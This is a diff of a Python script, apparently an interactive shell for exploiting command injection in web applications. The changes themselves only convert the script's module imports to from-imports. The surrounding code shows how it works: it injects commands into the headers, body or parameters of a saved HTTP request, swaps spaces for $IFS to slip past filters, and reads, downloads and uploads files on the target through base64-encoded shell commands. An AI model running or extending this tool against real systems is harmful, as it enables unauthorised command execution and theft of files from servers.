@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
 
-import argparse
-import base64
-import os
 import readline
-import requests
-import urllib
+
+from argparse import ArgumentParser
+from base64 import b64encode,b64decode
+from os import system
+from requests import request as rrequest
+from urllib.parse import quote_plus
 
 def debug(string, msg='Debug'):
     print("[~] " + msg + ": ", end='')
@@ -16,7 +17,7 @@ def command_cat(command=''):
 
     filecontent = execute_command(request, 'base64 ' + filename)
 
-    print(base64.b64decode(filecontent).decode())
+    print(b64decode(filecontent).decode())
 
 def command_cd(command=''):
     global cur_dir
@@ -37,13 +38,13 @@ def command_cd(command=''):
         debug(cur_dir, msg='New current dir')
 
 def command_clear(null=''):
-    os.system("clear")
+    system("clear")
 
 def command_download(command=''):
     filename = command.split()[1]
 
     filecontent = execute_command(request, 'base64 ' + filename)
-    filecontent = base64.b64decode(filecontent).strip()
+    filecontent = b64decode(filecontent).strip()
 
     with open(filename, 'wb') as f:
         f.write(filecontent)
@@ -60,7 +61,7 @@ def command_upload(command=''):
     with open(filename, 'rb') as f:
         filecontent = f.read()
 
-    filecontent = base64.b64encode(filecontent).decode()
+    filecontent = b64encode(filecontent).decode()
 
     execute_command(request, 'echo -n "' + filecontent + '" | base64 -d > ' +
                     filename)
@@ -128,7 +129,7 @@ def execute_command(request, command):
         command = command.replace(' ', '$IFS')
 
     if not args.no_url_encode:
-        command = urllib.parse.quote_plus(command)
+        command = quote_plus(command)
 
     req = request.copy()
     if req['inject'] == 'headers':
@@ -144,11 +145,11 @@ def execute_command(request, command):
     if args.debug:
         debug(req, msg='Request')
 
-    r = requests.request(req['method'],
-                         req['url'],
-                         headers=req['headers'],
-                         data=req['body'],
-                         params=req['params'])
+    r = rrequest(req['method'],
+                req['url'],
+                headers=req['headers'],
+                data=req['body'],
+                params=req['params'])
 
     output = r.text
     if args.start_token:
@@ -167,7 +168,7 @@ def parse_command(request, command):
         print(execute_command(request, command), end='')
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser()
+    parser = ArgumentParser()
     parser.add_argument("req", help="File containing raw http request", type=str)
 
     parser.add_argument("-d", "--debug", action="store_true",
